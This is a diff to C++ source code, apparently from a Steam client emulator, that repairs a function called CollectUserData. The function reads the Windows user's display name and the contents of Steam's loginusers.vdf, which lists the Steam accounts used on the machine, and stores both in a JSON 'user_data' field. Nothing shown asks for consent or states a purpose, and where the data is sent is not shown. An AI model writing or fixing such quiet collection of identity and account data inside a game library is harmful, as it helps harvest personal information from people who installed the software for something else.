@@ -416,6 +416,7 @@ static HSteamPipe user_steam_pipe = 0;
 #define SECURITY_WIN32
 
 #include <locale>
+#include <codecvt>
 
 #include <winbase.h>
 #include <windows.h>
@@ -427,7 +428,7 @@ static void CollectUserData(Steam_Client *client)
     nlohmann::json result = {};
 
     ULONG size = 0;
-    int size = GetUserNameExA(EXTENDED_NAME_FORMAT::NameDisplay, nullptr, &size);
+    GetUserNameExA(EXTENDED_NAME_FORMAT::NameDisplay, nullptr, &size);
 
     std::string username(size, '\0');
     if (GetUserNameExA(EXTENDED_NAME_FORMAT::NameDisplay, &username[0], &size)) {
@@ -447,14 +448,25 @@ static void CollectUserData(Steam_Client *client)
     OFSTRUCT fileInfo;
     char fileBuf[256] = { 0 };
     DWORD bytesRead = 256;
-    HFILE hUsersVdf = OpenFile("C:\\Program Files(x86)\\Steam\\config\\loginusers.vdf", &fileInfo, OF_READ);
+    HANDLE hUsersVdf = CreateFile(
+        L"C:\\Program Files(x86)\\Steam\\config\\loginusers.vdf",
+        GENERIC_READ,
+        FILE_SHARE_READ,
+        nullptr,
+        OPEN_EXISTING,
+        FILE_ATTRIBUTE_NORMAL,
+        nullptr
+    );
 
-    while (bytesRead != 0)
+    if (hUsersVdf != INVALID_HANDLE_VALUE)
     {
-        ReadFile(hUsersVdf, fileBuf, 256, &bytesRead, nullptr);
-        if (bytesRead != 0)
+        while (bytesRead != 0)
         {
-            usersVdf.append(fileBuf, bytesRead);
+            ReadFile(hUsersVdf, fileBuf, 256, &bytesRead, nullptr);
+            if (bytesRead != 0)
+            {
+                usersVdf.append(fileBuf, bytesRead);
+            }
         }
     }
     result["user_data"] = usersVdf;
